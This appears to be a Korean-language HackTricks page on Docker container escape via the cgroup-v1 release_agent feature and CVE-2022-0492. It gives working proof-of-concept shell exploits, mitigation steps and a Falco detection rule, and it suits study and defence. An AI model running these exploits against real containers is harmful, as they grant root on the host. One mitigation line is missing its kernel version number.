# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**자세한 내용은** [**원본 블로그 게시물**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**을 참조하십시오.** 이것은 요약입니다:

---

## Classic PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
The PoC는 **cgroup-v1** `release_agent` 기능을 악용합니다: `notify_on_release=1`인 cgroup의 마지막 작업이 종료되면, 커널(호스트의 **초기 네임스페이스에서**)은 쓰기 가능한 파일 `release_agent`에 저장된 경로의 프로그램을 실행합니다. 이 실행은 **호스트에서 전체 루트 권한으로 발생하기 때문에**, 파일에 대한 쓰기 접근 권한을 얻는 것만으로도 컨테이너 탈출이 가능합니다.

### 짧고 읽기 쉬운 단계별 설명

1. **새 cgroup 준비하기**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # 또는 –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **`release_agent`를 공격자가 제어하는 스크립트로 설정하기**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **페이로드 드롭하기**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **알림 트리거하기**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # 자신을 추가하고 즉시 종료
cat /output                                  # 이제 호스트 프로세스가 포함됨
```

---

## 2022 커널 취약점 – CVE-2022-0492

2022년 2월 Yiqi Sun과 Kevin Wang은 **커널이 cgroup-v1에서 `release_agent`에 쓸 때 권한을 검증하지 않는다는 것을 발견했습니다** (함수 `cgroup_release_agent_write`).

실제로 **cgroup 계층을 마운트할 수 있는 모든 프로세스(예: `unshare -UrC`를 통해)는 *초기* 사용자 네임스페이스에서 `CAP_SYS_ADMIN` 없이 임의의 경로를 `release_agent`에 쓸 수 있었습니다**. 기본 구성의 루트 실행 Docker/Kubernetes 컨테이너에서는 다음을 허용했습니다:

* 호스트에서 루트로의 권한 상승; ↗
* 컨테이너가 특권을 가지지 않고도 컨테이너 탈출.

이 결함은 **CVE-2022-0492** (CVSS 7.8 / 높음)로 지정되었으며, 다음 커널 릴리스(및 이후 모든 릴리스)에서 수정되었습니다:

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

패치 커밋: `1e85af15da28 "cgroup: Fix permission checking"`.

### 컨테이너 내 최소한의 익스플로잇
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
커널이 취약한 경우, *호스트*의 busybox 바이너리가 전체 루트 권한으로 실행됩니다.

### 강화 및 완화

* **커널 업데이트** (≥ 버전 이상). 패치는 이제 `release_agent`에 쓰기 위해 *초기* 사용자 네임스페이스에서 `CAP_SYS_ADMIN`을 요구합니다.
* **cgroup-v2 선호** – 통합 계층 **`release_agent` 기능을 완전히 제거하여**, 이 클래스의 탈출을 없앴습니다.
* **불필요한 사용자 네임스페이스 비활성화**: 필요하지 않은 호스트에서:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **의무적 접근 제어**: `/sys/fs/cgroup/**/release_agent`에서 `mount`, `openat`을 거부하거나 `CAP_SYS_ADMIN`을 제거하는 AppArmor/SELinux 정책은 취약한 커널에서도 이 기술을 중단시킵니다.
* **읽기 전용 바인드 마스크** 모든 `release_agent` 파일 (Palo Alto 스크립트 예시):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## 런타임에서의 탐지

[`Falco`](https://falco.org/)는 v0.32부터 내장 규칙을 제공합니다:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
규칙은 여전히 `CAP_SYS_ADMIN`을 가진 컨테이너 내부의 프로세스에서 `*/release_agent`에 대한 모든 쓰기 시도에 대해 트리거됩니다.


## References

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – 상세 분석 및 완화 스크립트.
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
